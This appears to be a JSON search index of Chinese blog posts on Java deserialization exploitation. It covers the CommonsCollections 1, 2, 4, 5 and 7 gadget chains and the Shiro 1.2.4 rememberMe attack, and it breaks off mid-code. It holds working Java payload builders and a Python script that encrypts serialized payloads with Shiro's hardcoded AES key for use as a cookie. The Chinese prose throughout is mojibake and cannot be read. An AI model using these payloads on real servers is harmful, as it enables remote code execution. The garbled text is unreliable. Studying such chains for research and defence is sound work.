[{"title":"CommonsCollections 2+4+5+7","url":"/2023/05/30/CommonsCollections-2-4-5-7/","content":"CommonsCollections 2+4+5+7CommonsCollections 4æˆ‘ä»¬åœ¨ä¹‹å‰çš„CC3ä¸­æ˜¯é€šè¿‡åŠ¨æ€ç±»åŠ è½½åˆå§‹åŒ–ä¸€ä¸ªç±»ï¼Œä»è€Œæ‰§è¡Œç±»ä¸­æ„é€ çš„æ¶æ„ä»£ç ï¼ŒCC4å’ŒCC3çš„æœ€ç»ˆä»£ç æ‰§è¡Œä½ç½®éƒ½æ˜¯ç›¸åŒçš„ï¼Œä¸è¿‡å‰é¢çš„æ„é€ è¿‡ç¨‹å¯èƒ½ä¼šæœ‰ä¸€äº›å·®åˆ«ã€‚\nCC4è¿™æ¡é“¾ç”¨äº†CommonsCollections4è¿™ä¸ªä¾èµ–ä¸­çš„ä¸€äº›å±æ€§ï¼Œæˆ‘ä»¬å…ˆä»ChainedTransformer.transformå…¥æ‰‹ï¼Œå¾€å›æ‰¾å…¶ä»–çš„åˆ©ç”¨ç‚¹ï¼š\n\næˆ‘ä»¬åœ¨CC4çš„compratorsåŒ…ä¸‹æ‰¾åˆ°äº†TransformingComprator.compareè¿™ä¸ªpublicæ–¹æ³•ï¼Œå¹¶ä¸”TransformingCompratorè¿™ä¸ªç±»æ˜¯å¯åºåˆ—åŒ–çš„ï¼š\n\næˆ‘ä»¬å†å¾€ä¸‹æ‰¾è°è°ƒç”¨äº†TransformingComprator.compareï¼Œæœ€ååœ¨javaåŸç”ŸutilåŒ…ä¸‹æ‰¾åˆ°äº†PriorityQueueï¼ˆä¼˜å…ˆé˜Ÿåˆ—ï¼‰ä¸­çš„siftDownUsingComparatoræ–¹æ³•ï¼š\n\nå¹¶ä¸”å°±åœ¨è¿™ä¸ªæ–¹æ³•çš„ä¸Šé¢ï¼Œsiftdownæ–¹æ³•è°ƒç”¨äº†siftDownUsingComparatoræ–¹æ³•ï¼Œæ‰€ä»¥æ¥ç€æ‰¾å“ªé‡Œè°ƒç”¨äº†siftdown.\n\nè¿˜æ˜¯åœ¨ä¼˜å…ˆé˜Ÿåˆ—è¿™ä¸ªç±»ä¸­ï¼Œheapifyæ–¹æ³•è°ƒç”¨äº†siftdownï¼Œè¿™é‡Œè¦æ³¨æ„æƒ³è¦æˆåŠŸè°ƒç”¨siftDownï¼Œå°±è¦è®©sizeè¿›è¡Œå³ç§»è¿ç®—å-1 &gt;= 0ï¼Œæ‰€ä»¥è¿™é‡Œsizeè‡³å°‘è¦ä¸º2ï¼š\n\nåœ¨å¾€ä¸‹æ‰¾ï¼Œæ‰¾åˆ°CC4çš„ç»ˆç‚¹ï¼Œåœ¨ä¼˜å…ˆé˜Ÿåˆ—çš„readObjectæ–¹æ³•ä¸­è°ƒç”¨äº†heapifyï¼š\n\nå¯ä»¥å‘ç°CC4ä¸CC3å”¯ä¸€åœ¨CommonsCollectionsä¸­ä¾èµ–çš„ä¸åŒå°±æ˜¯åœ¨TransformingCompratorè¿™ä¸ªç±»ä¸­ï¼Œå› ä¸ºä¼˜å…ˆé˜Ÿåˆ—æ˜¯javaä¸­è‡ªå¸¦çš„ä¸€ä¸ªå·¥å…·ç±»ï¼Œè€Œä¹‹æ‰€ä»¥è¿™æ¡åˆ©ç”¨é“¾åœ¨CC3ä¸­ç”¨ä¸äº†æ˜¯å› ä¸ºCC3åŒ…ä¸­è¿™ä¸ªç±»ä¸èƒ½ååºåˆ—åŒ–ï¼Œè€Œåœ¨CC4åŒ…ä¸­ï¼Œè¿™ä¸ªç±»å´ç»§æ‰¿äº†Serializableï¼Œæ‰€ä»¥åœ¨CC4ä¸­å°±å¯ä»¥ä½¿ç”¨è¿™æ¡é“¾è¿›è¡Œæ”»å‡»äº†\nCC3:\n\nCC4:\n\næ­£å‘æ„é€ åˆ©ç”¨é“¾ï¼š\npackage ysoserial.payloads.util.Test.util;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import org.apache.commons.collections4.comparators.TransformingComparator;import org.apache.commons.collections4.functors.ChainedTransformer;import org.apache.commons.collections4.Transformer;import org.apache.commons.collections4.functors.ConstantTransformer;import org.apache.commons.collections4.functors.InstantiateTransformer;import javax.xml.transform.Templates;import java.io.IOException;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Paths;import java.util.PriorityQueue;import static ysoserial.payloads.util.Test.util.Serialize.serialize;import static ysoserial.payloads.util.Test.util.Unserialize.unserialize;public class CC4Test {    public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException {        TemplatesImpl templatesimpl = new TemplatesImpl();        byte[] code  = Files.readAllBytes(Paths.get(\"/Users/y1zh3e7/webå®‰å…¨/Javaå®‰å…¨/ysoserial-master/target/classes/ysoserial/payloads/util/Test/Calc.class\"));        byte[][] codes = new byte[][]{code};        Class tem = Class.forName(\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\");        Field bytecodes = tem.getDeclaredField(\"_bytecodes\");        bytecodes.setAccessible(true);        bytecodes.set(templatesimpl,codes);        Field name = tem.getDeclaredField(\"_name\");        name.setAccessible(true);        name.set(templatesimpl,\"aaa\");        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templatesimpl});        Transformer[] transformers = new Transformer[]{            new ConstantTransformer(TrAXFilter.class),            instantiateTransformer        };        ChainedTransformer ctf = new ChainedTransformer(transformers);        TransformingComparator transformingComparator = new TransformingComparator&lt;&gt;(new ConstantTransformer&lt;&gt;(123));        PriorityQueue priorityQueue = new PriorityQueue&lt;&gt;(transformingComparator);        priorityQueue.add(1);        priorityQueue.add(2);        Field transformingComparatorFiled = transformingComparator.getClass().getDeclaredField(\"transformer\");        transformingComparatorFiled.setAccessible(true);        transformingComparatorFiled.set(transformingComparator,ctf);        serialize(priorityQueue);        unserialize(\"ser.bin\");    }}\n\nâ€‹    \nCommonsCollections 2CC2è¿™æ¡é“¾å’ŒCC4ä¸åŒçš„æ˜¯åœ¨åŠ è½½æ¶æ„ç±»åï¼Œä¼šé€šè¿‡è°ƒç”¨TemplatesImpl.newTransformerä»è€Œåˆå§‹åŒ–æ¶æ„ç±»ï¼Œæ‰§è¡Œä»£ç ï¼Œåœ¨CC4é“¾ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è°ƒç”¨TraxFilterç„¶åå†å¾€å‰æ¥ç€æ‰¾åˆ©ç”¨è¿ï¼Œè€ŒCC2åˆ™æ˜¯åœ¨è¿™é‡Œé€šè¿‡ç›´æ¥è°ƒç”¨InvokerTransformer.transformç›´æ¥è°ƒç”¨TemplatesImpl.newTransformer:\n\næ„é€ é“¾å¦‚ä¸‹ï¼š\npackage ysoserial.payloads.util.Test;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import org.apache.commons.collections4.comparators.TransformingComparator;import org.apache.commons.collections4.functors.ConstantTransformer;import org.apache.commons.collections4.functors.InvokerTransformer;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Paths;import java.util.PriorityQueue;import static ysoserial.payloads.util.Test.util.Serialize.serialize;import static ysoserial.payloads.util.Test.util.Unserialize.unserialize;public class CC2Test {    public static void main(String[] args) throws Exception{        TemplatesImpl templatesimpl = new TemplatesImpl();        byte[] code  = Files.readAllBytes(Paths.get(\"/Users/y1zh3e7/webå®‰å…¨/Javaå®‰å…¨/ysoserial-master/target/classes/ysoserial/payloads/util/Test/Calc.class\"));        byte[][] codes = new byte[][]{code};        Class tem = Class.forName(\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\");        Field bytecodes = tem.getDeclaredField(\"_bytecodes\");        bytecodes.setAccessible(true);        bytecodes.set(templatesimpl,codes);        Field name = tem.getDeclaredField(\"_name\");        name.setAccessible(true);        name.set(templatesimpl,\"aaa\");        InvokerTransformer invokerTransformer = new InvokerTransformer(\"newTransformer\",new Class[]{},new Object[]{});        TransformingComparator transformingComparator = new TransformingComparator&lt;&gt;(new ConstantTransformer&lt;&gt;(123));        PriorityQueue priorityQueue = new PriorityQueue&lt;&gt;(transformingComparator);        priorityQueue.add(templatesimpl);        priorityQueue.add(2);        Field transformingComparatorFiled = transformingComparator.getClass().getDeclaredField(\"transformer\");        transformingComparatorFiled.setAccessible(true);        transformingComparatorFiled.set(transformingComparator,invokerTransformer);        serialize(priorityQueue);        unserialize(\"ser.bin\");    }}\n\n\n\nCommonsCollections 5 &amp;&amp; CommonsCollections 7è¿™ä¸¤æ¡é“¾å­å°±å’ŒCC1ã€6çš„æ–¹å¼ä¸€æ ·äº†ï¼Œéƒ½æ˜¯é€šè¿‡è°ƒç”¨Runtime.execæ¥å‘½ä»¤æ‰§è¡Œï¼Œä¸è¿‡è°ƒç”¨readObjectçš„å…¥å£ç‚¹ä¸ä¸€æ ·äº†ï¼Œå…·ä½“å¦‚ä¸‹ï¼š\nCC5:\nBadAttributeValueExpException.readObject â€“&gt;  TiedMapEntry.toString  â€“&gt;  LazyMap.getï¼Œåç»­åˆ™å’ŒCC1ä¸€æ ·\nCC7:\nHashTable.readObject  â€“&gt;  AbstractMap.equals â€“&gt; LazyMay.getï¼Œåç»­å’ŒCC1ä¸€æ ·\næ‰€æœ‰è°ƒç”¨é“¾çš„è°ƒç”¨è¿‡ç¨‹ï¼š\n","categories":["WebSec"],"tags":["Javaååºåˆ—åŒ–"]},{"title":"Shiro550","url":"/2023/06/08/Shiro550/","content":"Shiro550ååºåˆ—åŒ–ç¯å¢ƒé…ç½®\nä»£ç å‡†å¤‡ï¼Œéœ€è¦1.2.4ç‰ˆæœ¬çš„shiroä»£ç æ¥è¿è¡Œï¼š\ngit clone https://github.com/apache/shiro.gitcd shirogit checkout shiro-root-1.2.4\nä¿®æ”¹mavenä¾èµ–ï¼šåœ¨é¡¹ç›®æ ¹ç›®å½•çš„pom.xmlä¸‹ä¿®æ”¹jstlä¾èµ–é¡¹ä¸º\n\n\n&lt;dependency&gt;            &lt;groupId&gt;javax.servlet&lt;/groupId&gt;            &lt;artifactId&gt;servlet-api&lt;/artifactId&gt;            &lt;version&gt;2.5&lt;/version&gt;            &lt;scope&gt;provided&lt;/scope&gt;        &lt;/dependency&gt;\n\n\njdkåŠtomcatç‰ˆæœ¬é€‰ç”¨ï¼š\njdké€‰ç”¨1.7ï¼šJava Archive Downloads - Java SE 7 (oracle.com)\ntomcaté€‰ç”¨8.xï¼šApache TomcatÂ® - Apache Tomcat 8 Software Downloads\n\nideaä¸­é…ç½®tomcatå¹¶è¿è¡Œshiroé¡¹ç›®ï¼š\nç­‰å¾…mavenä¾èµ–å¯¼å…¥å®Œæˆåå°±å¯ä»¥é…ç½®tomcatäº†ï¼Œä¸€éƒ¨åˆ†mavenä¾èµ–å¯èƒ½æ— æ³•å¯¼å…¥ï¼Œä½†ä¸å½±å“é¡¹ç›®æ­£å¸¸å¯åŠ¨ã€‚\ntomcatçš„é…ç½®ï¼Œæ­¤å¤–ä¹Ÿè¦å¯¹é¡¹ç›®å·¥ç¨‹åŠsdkå’Œjavaç¼–è¯‘ç‰ˆæœ¬é€‰æ‹©ä¸º1.7ï¼Œè¿™é‡Œè¦å°†HTTP portæ”¹ä¸ºå…¶ä»–ç«¯å£ï¼Œå› ä¸ºä¸€ä¼šæˆ‘ä»¬éœ€è¦ç”¨burpsuiteæŠ“åŒ…ï¼Œburpsuiteé»˜è®¤ç«¯å£ä¹Ÿæ˜¯8080ï¼Œä¼šé€ æˆç«¯å£å†²çªï¼š\n\n\næˆåŠŸå¯åŠ¨åå¦‚ä¸‹ï¼š\n\n\n\n\nURLDNSæ¢æµ‹Shiro550æˆ‘ä»¬åœ¨æ­å»ºå¥½çš„ç½‘ç«™ä¸Šè¿›è¡Œç™»é™†ï¼Œå¹¶ä¸”è¦å‹¾é€‰RemembermeåæŠ“åŒ…ï¼Œå¯ä»¥å‘ç°åœ¨Serverç«¯è¿”å›çš„Cookieä¸­æœ‰ä¸€ä¸ªrememberMeå­—æ®µï¼Œå¹¶ä¸”å…¶ä¸­çœ‹èµ·æ¥åƒæ˜¯åŠ å¯†å‚¨å­˜äº†ä¸€äº›å†…å®¹ï¼š    \næˆ‘ä»¬å¯ä»¥åœ¨shiroçš„æºç ä¸­å‘ç°å®ç°è¿™ä¸ªåŠŸèƒ½çš„ç±»CookieRememberMeManagerï¼Œæ‰¾åˆ°å…¶ä¸­çš„getRememberedSerializedIdentityè¿™ä¸ªæ–¹æ³•ï¼Œå¯ä»¥çœ‹çš„å‡ºæ¥è¿™ä¸ªæ–¹æ³•ä¼šä»è¯·æ±‚ä¸­è·å–è¿™ä¸ªCookieå¹¶è¿”å›ï¼Œæ‰€ä»¥æ¥ä¸‹æ¥çš„é€»è¾‘å°±æ˜¯æ‰¾å“ªä¸ªæ–¹æ³•è°ƒç”¨äº†è¿™ä¸ªæ–¹æ³•ï¼Œç„¶åå¯¹Cookieè¿›è¡Œè§£å¯†ç­‰å¤„ç†ï¼š\nprotected byte[] getRememberedSerializedIdentity(SubjectContext subjectContext) {      if (!WebUtils.isHttp(subjectContext)) {          if (log.isDebugEnabled()) {              String msg = \"SubjectContext argument is not an HTTP-aware instance.  This is required to obtain a \" +                      \"servlet request and response in order to retrieve the rememberMe cookie. Returning \" +                      \"immediately and ignoring rememberMe operation.\";              log.debug(msg);          }          return null;      }      WebSubjectContext wsc = (WebSubjectContext) subjectContext;      if (isIdentityRemoved(wsc)) {          return null;      }      HttpServletRequest request = WebUtils.getHttpRequest(wsc);      HttpServletResponse response = WebUtils.getHttpResponse(wsc);      String base64 = getCookie().readValue(request, response);      // Browsers do not always remove cookies immediately (SHIRO-183)      // ignore cookies that are scheduled for removal      if (Cookie.DELETED_COOKIE_VALUE.equals(base64)) return null;      if (base64 != null) {          base64 = ensurePadding(base64);          if (log.isTraceEnabled()) {              log.trace(\"Acquired Base64 encoded identity [\" + base64 + \"]\");          }          byte[] decoded = Base64.decode(base64);          if (log.isTraceEnabled()) {              log.trace(\"Base64 decoded byte array length: \" + (decoded != null ? decoded.length : 0) + \" bytes.\");          }          return decoded;      } else {          //no cookie set - new site visitor?          return null;      }  }\n\nåœ¨org/apache/shiro/mgt/AbstractRememberMeManagerè¿™ä¸ªç±»ä¸­æˆ‘ä»¬æ‰¾åˆ°äº†getRememberedPrincipalsè¿™ä¸ªæ–¹æ³•è°ƒç”¨äº†getRememberedSerializedIdentityï¼Œç„¶åæŠŠè¿™ä¸ªCookieç”¨convertBytesToPrincipalsè¿›è¡Œå¤„ç†ï¼Œæˆ‘ä»¬è·Ÿè¿›è¿™ä¸ªæ–¹æ³•ï¼š\npublic PrincipalCollection getRememberedPrincipals(SubjectContext subjectContext) {    PrincipalCollection principals = null;    try {        byte[] bytes = getRememberedSerializedIdentity(subjectContext);        //SHIRO-138 - only call convertBytesToPrincipals if bytes exist:        if (bytes != null &amp;&amp; bytes.length &gt; 0) {            principals = convertBytesToPrincipals(bytes, subjectContext);        }    } catch (RuntimeException re) {        principals = onRememberedPrincipalFailure(re, subjectContext);    }    return principals;}\n\nå¯ä»¥çœ‹åˆ°è¿™ä¸ªæ–¹æ³•åšäº†ä¸¤ä»¶äº‹ï¼Œä¸€ä¸ªæ˜¯å¯¹è¿™ä¸ªä¼ è¿‡æ¥çš„Cookieè¿›è¡Œdecryptï¼ˆè§£å¯†ï¼‰ï¼Œä¸€ä¸ªæ˜¯å¯¹è¿™ä¸ªCookieè¿›è¡Œdeserializeï¼ˆååºåˆ—åŒ–ï¼‰ï¼Œæˆ‘ä»¬åˆ†åˆ«è·Ÿè¿›è¿™ä¸¤ä¸ªæ–¹æ³•çœ‹ä¸€ä¸‹ï¼š\nprotected PrincipalCollection convertBytesToPrincipals(byte[] bytes, SubjectContext subjectContext) {    if (getCipherService() != null) {        bytes = decrypt(bytes);    }    return deserialize(bytes);}\n\nå…ˆæ¥çœ‹deserializeï¼š\nprotected PrincipalCollection deserialize(byte[] serializedIdentity) {    return getSerializer().deserialize(serializedIdentity);}\n\nè¿™ä¸ªå‡½æ•°æŠŠCookieä¼ ç»™äº†getSerializer().deserialize()è¿™ä¸ªæ–¹æ³•ï¼ŒgetSerializerçš„è¿”å›å€¼æ˜¯serializerï¼Œè¿™ä¸ªå˜é‡åœ¨æ„é€ å‡½æ•°å†…è¿›è¡Œäº†åˆå§‹åŒ–ï¼Œæ˜¯ä¸€ä¸ªDefaultSerializerï¼Œå› æ­¤æˆ‘ä»¬è·Ÿè¿›DefaultSerializer.deserialize\n    public Serializer&lt;PrincipalCollection&gt; getSerializer() {        return serializer;    }## æ„é€ å‡½æ•°public AbstractRememberMeManager() {        this.serializer = new DefaultSerializer&lt;PrincipalCollection&gt;();        this.cipherService = new AesCipherService();        setCipherKey(DEFAULT_CIPHER_KEY_BYTES);    }\n\nå¯ä»¥å‘ç°å°±æ˜¯å®ç°äº†ä¸€ä¸ªååºåˆ—åŒ–ï¼Œå› æ­¤ç¡®å®å­˜åœ¨ååºåˆ—åŒ–æ¼æ´çš„ç‚¹ï¼Œæˆ‘ä»¬æ¥ä¸‹æ¥å°±è¦ç ´è§£ä¸Šé¢çš„åŠ å¯†ç®—æ³•ï¼Œä»è€Œèƒ½è®©æˆ‘ä»¬è‡ªå·±çš„payloadåŠ å¯†åå‘è¿‡å»ï¼š\npublic T deserialize(byte[] serialized) throws SerializationException {    if (serialized == null) {        String msg = \"argument cannot be null.\";        throw new IllegalArgumentException(msg);    }    ByteArrayInputStream bais = new ByteArrayInputStream(serialized);    BufferedInputStream bis = new BufferedInputStream(bais);    try {        ObjectInputStream ois = new ClassResolvingObjectInputStream(bis);        @SuppressWarnings({\"unchecked\"})        T deserialized = (T) ois.readObject();        ois.close();        return deserialized;    } catch (Exception e) {        String msg = \"Unable to deserialze argument byte array.\";        throw new SerializationException(msg, e);    }}\n\nå›åˆ°decryptä¸Šï¼Œdecryptæ–¹æ³•å…ˆé€šè¿‡getDecryptionCipherKeyæ–¹æ³•è·å–äº†ä¸€ä¸ªå¯†é’¥ï¼Œç„¶åå°†Cookieäº¤ç»™cipherService.decryptæ–¹æ³•è§£å¯†ï¼š\nprotected byte[] decrypt(byte[] encrypted) {     byte[] serialized = encrypted;     CipherService cipherService = getCipherService();     if (cipherService != null) {         ByteSource byteSource = cipherService.decrypt(encrypted, getDecryptionCipherKey());         serialized = byteSource.getBytes();     }     return serialized; }\n\nå¯ä»¥çœ‹åˆ°cipherServiceæ˜¯é€šè¿‡getCipherServiceæ–¹æ³•å¾—åˆ°çš„ï¼Œè·Ÿè¿›å‘ç°è¿”å›å€¼åœ¨æ„é€ å‡½æ•°ä¸­åˆå§‹åŒ–ï¼Œå…¶å®åˆ°è¿™é‡Œå¯ä»¥çœ‹çš„å‡ºæ¥å°±æ˜¯ä¸ªAesåŠ å¯†äº†ï¼ˆå¹¶ä¸”ä¸‹é¢çš„setCipherKeyå…¶å®å°±æ˜¯AESçš„å¯†é’¥ï¼Œä¸è¿‡æˆ‘ä»¬å‡è£…ä¸çŸ¥é“ä¸€ä¼šå†æ‰¾å›æ¥ï¼‰ï¼Œç»§ç»­è·Ÿè¿›AesCipherServiceçš„è¯å¯ä»¥çœ‹åˆ°AesåŠ å¯†çš„å…·ä½“æ–¹å¼ï¼Œè¿™é‡Œå°±ä¸å±•ç¤ºå‡ºæ¥äº†ï¼š\npublic AbstractRememberMeManager() {    this.serializer = new DefaultSerializer&lt;PrincipalCollection&gt;();    this.cipherService = new AesCipherService();    setCipherKey(DEFAULT_CIPHER_KEY_BYTES);}\n\næˆ‘ä»¬å†å›å¤´çœ‹getDecryptionCipherKeyæ–¹æ³•è·å–å¯†é’¥çš„é€»è¾‘ï¼Œè·Ÿè¿›ï¼š\npublic byte[] getDecryptionCipherKey() {    return decryptionCipherKey;}\n\nå†æ‰¾decryptionCipherKeyè¿™ä¸ªå±æ€§åœ¨å“ªé‡Œè¿›è¡Œçš„èµ‹å€¼ï¼Œå¯ä»¥å‘ç°æ˜¯é€šè¿‡setterèµ‹å€¼ï¼ˆFind Usage -&gt; Value Writeï¼‰ï¼š\npublic void setDecryptionCipherKey(byte[] decryptionCipherKey) {     this.decryptionCipherKey = decryptionCipherKey; }\n\næ¥ç€çœ‹å“ªé‡Œè°ƒç”¨äº†setDecryptionCipherKeyæ–¹æ³•ï¼Œå‘ç°åœ¨setCipherKeyæ–¹æ³•ä¸­ï¼š\npublic void setCipherKey(byte[] cipherKey) {    //Since this method should only be used in symmetric ciphers    //(where the enc and dec keys are the same), set it on both:    setEncryptionCipherKey(cipherKey);    setDecryptionCipherKey(cipherKey);}\n\næœ€ç»ˆå…¶å®è¿˜æ˜¯åœ¨æ„é€ å‡½æ•°ä¼ äº†å¯†é’¥ï¼Œå¹¶ä¸”å¯ä»¥å‘ç°å¯†é’¥æ˜¯ä¸€ä¸ªå†™æ­»çš„å¸¸é‡ï¼Œå› æ­¤é—®é¢˜å°±å‡ºåœ¨è¿™é‡Œï¼Œåœ¨shiro1.2.4ç‰ˆæœ¬ä¸‹ï¼Œå¯†é’¥æ˜¯å†™æ­»çš„ï¼Œå¹¶ä¸”é‡‡ç”¨çš„æ˜¯AESåŠ å¯†ï¼ˆå¯¹ç§°åŠ å¯†ï¼‰ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™ä¸ªå¯†é’¥è‡ªå·±æ„é€ payloadå¹¶åŠ å¯†åä¼ è¿‡å»è¿›è¡Œååºåˆ—åŒ–æ”»å‡»ï¼š\npublic AbstractRememberMeManager() {        this.serializer = new DefaultSerializer&lt;PrincipalCollection&gt;();        this.cipherService = new AesCipherService();        setCipherKey(DEFAULT_CIPHER_KEY_BYTES);    } private static final byte[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode(\"kPH+bIxk5D2deZiIxcaaaA==\");\n\n\næˆ‘ä»¬çœ‹ä¸€ä¸‹åœ¨è¿™ä¸ªåŒ…ä¸­çš„Mavenä¾èµ–æœ‰å“ªä¸ªæ˜¯æˆ‘ä»¬å¯æ”»å‡»çš„ï¼Œå‘ç°å­˜åœ¨commons-collections3.xï¼Œä¸è¿‡å¯ä»¥å‘ç°è¿™ä¸ªä¾èµ–é¡¹çš„scopeæ˜¯testï¼Œä¹Ÿå°±æ˜¯è¯´åªæœ‰åœ¨testä¸­è¿è¡Œæ—¶è¿™ä¸ªä¾èµ–æ‰ä¼šè¢«å¯¼å…¥ï¼Œé‚£ä¹ˆçœŸå®æ¡ä»¶ä¸‹æ˜¯ä¸å­˜åœ¨è¿™ä¸ªä¾èµ–çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬æ˜¯æ²¡æœ‰åŠæ³•é€šè¿‡è¿™ä¸ªä¾èµ–è¿›è¡Œæ”»å‡»çš„ï¼š\n\nå®é™…ä¸Šå¯ä»¥æ”»å‡»çš„ä¾èµ–æ˜¯commons-beanutilsè¿™ä¸ªä¾èµ–ï¼Œä¸è¿‡æˆ‘ä»¬è¿™é‡Œå…ˆç”¨Javaè‡ªå¸¦çš„URLDNSè¿›è¡Œä¸€ä¸‹æµ‹è¯•\n\n\nå°†URLDNSçš„åˆ©ç”¨ç±»åºåˆ—åŒ–å‡ºæ¥ï¼Œæˆ‘è¿™é‡Œåºåˆ—åŒ–åä¿å­˜çš„æ–‡ä»¶åå«åšser.binï¼š\npackage ysoserial.payloads.util.Test;import java.lang.reflect.Field;import java.net.URL;import java.util.HashMap;import static ysoserial.payloads.util.Test.util.Serialize.serialize;import static ysoserial.payloads.util.Test.util.Unserialize.unserialize;public class URLDNSTest{    public static void main(String[] args) throws Exception{      // urlä¸ºæ¥æ”¶dnsè¯·æ±‚çš„url è‡ªå·±ä¿®æ”¹        URL url = new URL(\"xxx.com\");        Class c = url.getClass();        Field hashcodeField = c.getDeclaredField(\"hashCode\");        hashcodeField.setAccessible(true);        hashcodeField.set(url,1234);        HashMap hashMap = new HashMap();        hashMap.put(url,1);        hashcodeField.set(url,-1);        serialize(hashMap);    }}\n\nè¿™æ˜¯æ ¹æ®shiroåŠ å¯†çš„é€»è¾‘å†™å‡ºçš„æ„é€ æ–°payloadçš„è„šæœ¬ï¼š\nimport base64import uuidfrom random import Randomfrom Crypto.Cipher import AESdef get_file_data(filename):    with open(filename, 'rb') as f:        data = f.read()    return datadef aes_enc(data):     BS = AES.block_size     pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()     key = \"kPH+bIxk5D2deZiIxcaaaA==\"     mode = AES.MODE_CBC     iv = uuid.uuid4().bytes     encryptor = AES.new(base64.b64decode(key), mode, iv)     ciphertext = base64.b64encode(iv + encryptor.encrypt(pad(data)))     return ciphertextdef aes_dec(enc_data):    enc_data = base64.b64decode(enc_data)    unpad = lambda s : s[:-s[-1]]    key = \"kPH+bIxk5D2deZiIxcaaaA==\"    mode = AES.MODE_CBC    iv = enc_data[:16]    encryptor = AES.new(base64.b64decode(key), mode, iv)    plaintext = encryptor.decrypt(enc_data[16:])    plaintext = unpad(plaintext)    return plaintextif __name__ == '__main__':    data = get_file_data(\"ser.bin\")    print(aes_enc(data))\n\næŠŠser.binå’Œè„šæœ¬æ”¾åœ¨åŒä¸€ç›®å½•ä¸‹è¿è¡Œè„šæœ¬å³å¯ï¼š\n\n\næ›¿æ¢Cookieè¿›è¡Œå‘åŒ…ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯è¦å°†Cookieä¸­çš„SessionIdåˆ é™¤æ‰ï¼Œå¦åˆ™Shiroä¼šç›´æ¥ç”¨Sessionidè€Œä¸æ˜¯remembermeï¼š\n\nå…³äºå¦‚ä½•é€šè¿‡cbé“¾å‘½ä»¤æ‰§è¡Œå…ˆğŸ¦ä¸€æ‰‹ æœ‰ç©ºè¡¥ä¸Šæ¥\n","categories":["WebSec"],"tags":["Shiro550ååºåˆ—åŒ–"]},{"title":"CommonsCollections1+6","url":"/2023/05/18/CommonsCollections1-6/","content":"CommonsCollections1ç¬¬ä¸€æ¡é“¾å­ï¼šå‚è€ƒè§†é¢‘ï¼šJavaååºåˆ—åŒ–CommonsCollectionsç¯‡(ä¸€) CC1é“¾æ‰‹å†™EXP_å“”å“©å“”å“©_bilibili\nJavaç¯å¢ƒjdk8u65 ä¸‹è½½é“¾æ¥ï¼šJava Archive Downloads - Java SE 8 (oracle.com)\nä»€ä¹ˆæ˜¯CommonsCollectionsCommonsï¼šApache Commonsæ˜¯Apacheè½¯ä»¶åŸºé‡‘ä¼šçš„é¡¹ç›®ï¼ŒCommonsçš„ç›®çš„æ˜¯æä¾›å¯é‡ç”¨çš„è§£å†³å„ç§å®é™…é—®é¢˜çš„Javaå¼€æºä»£ç ã€‚\nCommons Collectionsï¼šJavaä¸­æœ‰ä¸€ä¸ªCollectionsåŒ…ï¼Œå†…éƒ¨å°è£…äº†è®¸å¤šæ–¹æ³•ç”¨æ¥å¯¹é›†åˆè¿›è¡Œå¤„ç†ï¼ŒCommonsCollectionsåˆ™æ˜¯å¯¹Collectionsè¿›è¡Œäº†è¡¥å……ï¼Œå®Œå–„äº†æ›´å¤šå¯¹é›†åˆå¤„ç†çš„æ–¹æ³•ï¼Œå¤§å¤§æé«˜äº†æ€§èƒ½ã€‚\nCommonsCollections1é¦–å…ˆæˆ‘ä»¬æ¥çœ‹ä¸€ä¸ªæ¥å£ï¼Œè¯¥æ¥å£å†…æœ‰ä¸€ä¸ªæ–¹æ³•ï¼š\npublic interface Transformer {    /**     * Transforms the input object (leaving it unchanged) into some output object.     *     * @param input  the object to be transformed, should be left unchanged     * @return a transformed object     * @throws ClassCastException (runtime) if the input is the wrong class     * @throws IllegalArgumentException (runtime) if the input is invalid     * @throws FunctorException (runtime) if the transform cannot be completed     */    public Object transform(Object input);}\n\næˆ‘ä»¬åœ¨è¯¥æ¥å£çš„ä¼—å¤šå®ç°ç±»ä¸­é”å®šå¯ä»¥åˆ©ç”¨çš„ç±»InvokerTransformerï¼Œå‘ç°InvokerTransformerçš„transformæ–¹æ³•åˆ©ç”¨åå°„å¯ä»¥å®ç°ä»»æ„æ–¹æ³•è°ƒç”¨ï¼Œæ‰§è¡Œè¿‡ç¨‹æ˜¯å…ˆä»transformæ–¹æ³•æ¥æ”¶ä¸€ä¸ªç±»ï¼Œé€šè¿‡åå°„è·å¾—è¿™ä¸ªç±»çš„classå¯¹è±¡ï¼Œå†é€šè¿‡æ„é€ å‡½æ•°æ¥å—æ–¹æ³•åå­—ï¼Œå‚æ•°ç±»å‹ï¼Œå‚æ•°åˆ—è¡¨ï¼Œå®ç°äº†ä»»æ„æ–¹æ³•è°ƒç”¨ï¼š\npublic InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {        super();        iMethodName = methodName;        iParamTypes = paramTypes;        iArgs = args;    }public Object transform(Object input) {        if (input == null) {            return null;        }        try {            Class cls = input.getClass();            Method method = cls.getMethod(iMethodName, iParamTypes);            return method.invoke(input, iArgs);\n\næ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™è¡Œä»£ç æ¥å¼¹è®¡ç®—å™¨ï¼Œå…¶å®ä¹Ÿå°±æ˜¯åˆ©ç”¨äº†Invokertransformerä¸­è‡ªå¸¦çš„åå°„çœç•¥äº†åå°„çš„æ­¥éª¤ï¼š\nRuntime currentRuntime = Runtime.getRuntime();new InvokerTransformer(\"exec\",new Class[]{String.class},new 